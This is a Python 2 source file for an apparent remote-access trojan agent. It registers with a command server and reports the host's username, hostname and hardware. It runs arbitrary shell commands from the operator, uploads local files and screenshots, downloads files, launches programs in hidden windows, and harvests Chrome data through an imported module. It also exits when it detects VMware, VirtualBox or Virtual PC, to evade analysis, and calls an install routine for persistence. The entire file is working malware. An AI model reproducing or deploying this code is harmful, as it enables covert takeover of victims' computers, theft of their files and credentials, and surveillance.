#!/usr/bin/env python2
# coding: utf-8
import chrome
import ctypes
import install
import win32com.client
import base64,wget,wmi
import requests
import time
import os
import subprocess
import platform
import shutil
import sys
import traceback
import threading
from uuid import getnode as get_mac
import StringIO
import zipfile
import tempfile
import getpass
import config

if os.name == 'nt':
    from PIL import ImageGrab
else:
    import pyscreenshot as ImageGrab



def threaded(func):
    def wrapper(*_args, **kwargs):
        t = threading.Thread(target=func, args=_args)
        t.start()
        return
    return wrapper


class Result():
	def __init__(self):
	    pass

	def run(self):
	    print '[*] Running'
	    ret_list = []

	    try:	        
	        chrome_win = chrome.Chrome()
	        ret_list.append("Chrome")
	        ret_list.append(chrome_win.run())
	    except:
	        pass 
	    
	    return ret_list


class Start(object):

    
    def __init__(self):
        gpu = subprocess.check_output(["wmic","path","win32_VideoController", "get","name"], shell=True).strip().split("\n")[1]
        cpu = subprocess.check_output(["wmic","cpu","get", "name"], shell=True).strip().split("\n")[1]
        memory = subprocess.check_output(["wmic","computersystem","get", "TotalPhysicalMemory"], shell=True).strip().split("\n")[1]        
        gpu =  ' '.join([gpu])
        cpu =  ' '.join([cpu])
        memory =  ' '.join([memory])        
        self.idle = True       
        self.platform = platform.system() + " " + platform.release()
        self.last_active = time.time()        
        self.uid = self.get_UID()
        self.hostname = platform.node()
        self.username = getpass.getuser() 
        self.cpu = cpu
        self.gpu = gpu
        self.memory = memory
        

    
    def ehidden(self, directory):
        """ Change current directory """
        try:
            self.send_output("[*] Exec Hidden %s..." % directory)
            fileLINK = "%s"%(directory)
            SW_HIDE = 0
            info = subprocess.STARTUPINFO()
            info.dwFlags = subprocess.STARTF_USESHOWWINDOW
            info.wShowWindow = SW_HIDE
            subprocess.Popen(fileLINK, startupinfo=info)
            self.send_output("[+] Exec Hidden %s Successful" % directory)
        except Exception as exc:
            self.send_output(traceback.format_exc())
    
    def vmDetect(self):    
            strComputer = "."
            objWMIService = win32com.client.Dispatch("WbemScripting.SWbemLocator")
            objSWbemServices = objWMIService.ConnectServer(strComputer,"root\cimv2")
            colItems = objSWbemServices.ExecQuery("SELECT * FROM Win32_ComputerSystemProduct")
            for objItem in colItems:
                    if objItem.Name != None:	
                            VMNAME = objItem.Name
                    if VMNAME == "VMware Virtual Platform":
                            return 1
                    if VMNAME == "VirtualBox":
                            return 1
                    if VMNAME == "Virtual PC":
                            return 1
                    else:
                            return 0
   
    
    def log(self, to_log):
        """ Write data to agent log """
        print(to_log)
        

    
    def get_UID(self):
        """ Returns a unique ID for the agent """
        return getpass.getuser() + "_" + str(get_mac())
        

    
    def server_up(self):
        """ Ask server for instructions """        
        req = requests.post(config.SERVER + '/api/' + base64.b16encode(self.uid) + '/hello',
            json={'platform': base64.b16encode(self.platform), 'hostname': base64.b16encode(self.hostname), 'username': base64.b16encode(self.username), 'cpu': base64.b16encode(self.cpu), 'gpu': base64.b16encode(self.gpu), 'memory': base64.b16encode(self.memory)})
        return req.text
        

    
    def send_output(self, output, newlines=True):
        """ Send console output to server """        
        if not output:
            return
        if newlines:
            output += "\n\n"
        req = requests.post(config.SERVER + '/api/' + base64.b16encode(self.uid) + '/report', 
        data={'output': output})
        

    
    def expand_path(self, path):
        """ Expand environment variables and metacharacters in a path """
        return os.path.expandvars(os.path.expanduser(path))
        

    
    @threaded
    def run__cmd(self, cmd):
        """ Runs a shell command and returns its output """
        try:
            proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = proc.communicate()
            output = (out + err)
            self.send_output(output)
            
        except Exception as exc:
            self.send_output(traceback.format_exc())
            

    
    def cd(self, directory):
        """ Change current directory """
        os.chdir(self.expand_path(directory))
        

    
    @threaded
    def upload(self, file):
        """ Uploads a local file to the server """
        file = self.expand_path(file)
        try:
            if os.path.exists(file) and os.path.isfile(file):
                self.send_output("[*] Uploading %s..." % file)
                requests.post(config.SERVER + '/api/' + base64.b16encode(self.uid) + '/upload',
                    files={'uploaded': open(file, 'rb')})
                
            else:
                self.send_output('[!] No such file: ' + file)
                
        except Exception as exc:
            self.send_output(traceback.format_exc())
            

    
    @threaded
    def download(self, file, destination=''):
        """ Downloads a file the the agent host through HTTP(S) """
        try:
            destination = self.expand_path(destination)
            if not destination:
                destination= file.split('/')[-1]
            self.send_output("[*] Downloading %s..." % file)
            wget.download(file,destination)
            self.send_output("[+] File downloaded: " + destination)
            
        except Exception as exc:
            self.send_output(traceback.format_exc())
            

    
    @threaded
    def zip(self, zip_name, to_zip):
        """ Zips a folder or file """
        try:
            zip_name = self.expand_path(zip_name)
            to_zip = self.expand_path(to_zip)
            if not os.path.exists(to_zip):
                self.send_output("[+] No such file or directory: %s" % to_zip)
                return
            self.send_output("[*] Creating zip archive...")
            zip_file = zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED)
            if os.path.isdir(to_zip):
                relative_path = os.path.dirname(to_zip)
                for root, dirs, files in os.walk(to_zip):
                    for file in files:
                        zip_file.write(os.path.join(root, file), os.path.join(root, file).replace(relative_path, '', 1))
            else:
                zip_file.write(to_zip, os.path.basename(to_zip))
            zip_file.close()
            self.send_output("[+] Archive created: %s" % zip_name)
        except Exception as exc:
            self.send_output(traceback.format_exc())

    
    @threaded
    def unzip(self,to_zip,to_path):
        """ Zips a folder or file """
        try:            
            to_zip = self.expand_path(to_zip)
            if not os.path.exists(to_zip):
                self.send_output("[+] No such file: %s" % to_zip)
                return
            self.send_output("[*] Unzip archive...")
            fantasy_zip = zipfile.ZipFile(to_zip)
            fantasy_zip.extractall(to_path)
            self.send_output("[+] Unzip Succefull to: %s" % to_path)
        except Exception as exc:
            self.send_output(traceback.format_exc())

        

    
    @threaded
    def screenshot(self):
        """ Takes a screenshot and uploads it to the server"""
        screenshot = ImageGrab.grab()
        tmp_file = tempfile.NamedTemporaryFile()
        screenshot_file = tmp_file.name + ".png"
        tmp_file.close()
        screenshot.save(screenshot_file)
        self.upload(screenshot_file)
        

    
    @threaded
    def bye(self):
        install.clean()
        self.send_output('Register Removed')
        

    
    @threaded
    def info(self):
        try:
            self.send_output("[*] Get Infos...")
            tem = Result()
            slave_info = "infos.txt"
            open_slave_info = open(slave_info,"w")
            open_slave_info.write(str(tem.run())+"\n")
            open_slave_info.close()
            self.upload(slave_info)
            
        except Exception as exc:
            self.send_output(traceback.format_exc())
            

    
    def help(self):
        """ Displays the help """
        self.send_output(config.HELP)
        

    
    def run(self):
        """ Main loop """        
        while True:
            try:
                time.sleep(config.PAUSE_AT_START)
                todo = self.server_up()
                
                # Something to do ?                
                if todo:
                    commandline = todo
                    self.idle = False
                    self.last_active = time.time()
                    self.send_output('$ ' + commandline)
                    split_cmd = commandline.split(" ")
                    command = split_cmd[0]
                    args = []
                    if len(split_cmd) > 1:
                        args = split_cmd[1:]
                    try:
                        if command == 'cd':
                            if not args:
                                self.send_output('usage: cd </path/to/directory>')
                            else:
                                self.cd(args[0])
                        elif command == 'upload':
                            if not args:
                                self.send_output('usage: upload <localfile>')
                            else:
                                self.upload(args[0])
                        elif command == 'ehidden':
                            if not args:
                                self.send_output('usage: ehidden <localfile>')
                            else:
                                self.ehidden(args[0])

                        elif command == 'unzip':
                            if not args:
                                self.send_output('usage: unzip <localfile> <pathname>')
                            else:
                                if len(args) == 1:
                                    self.send_output('usage: unzip <localfile> <pathname>')
                                if len(args) == 2:
                                    self.unzip(args[0], args[1])

                        elif command == 'download':
                            if not args:
                                self.send_output('usage: download <remote_url> <destination>')
                            else:
                                if len(args) == 2:
                                    self.download(args[0], args[1])
                                else:
                                    self.download(args[0])
                        elif command == 'exit':
                            self.exit()
                        elif command == 'zip':
                            if not args or len(args) < 2:
                                self.send_output('usage: zip <archive_name> <folder>')
                            else:
                                self.zip(args[0], " ".join(args[1:]))
                        elif command == 'screenshot':
                            self.screenshot()
                        elif command == 'help':
                            self.help()
                        elif command == 'info':
                            self.info()
                        elif command == 'bye':
                            self.bye()
                        elif command == 'version':
                            self.send_output(config.BOTVERSION)  
                        else:
                            self.run__cmd(commandline)
                    except Exception as exc:
                        self.send_output(traceback.format_exc())
                else:
                    if self.idle:
                        time.sleep(config.HELLO_INTERVAL)
                    elif (time.time() - self.last_active) > config.IDLE_TIME:
                        self.log("Switching to idle mode...")
                        self.idle = True
                    else:
                        time.sleep(0.5)
            except Exception as exc:
                self.log(traceback.format_exc())                
                time.sleep(config.HELLO_INTERVAL)


def main():    
    start = Start()
    if start.vmDetect() == config.VM:
            sys.exit()    
    install.install()
    start.run()
    

if __name__ == "__main__":
    main()
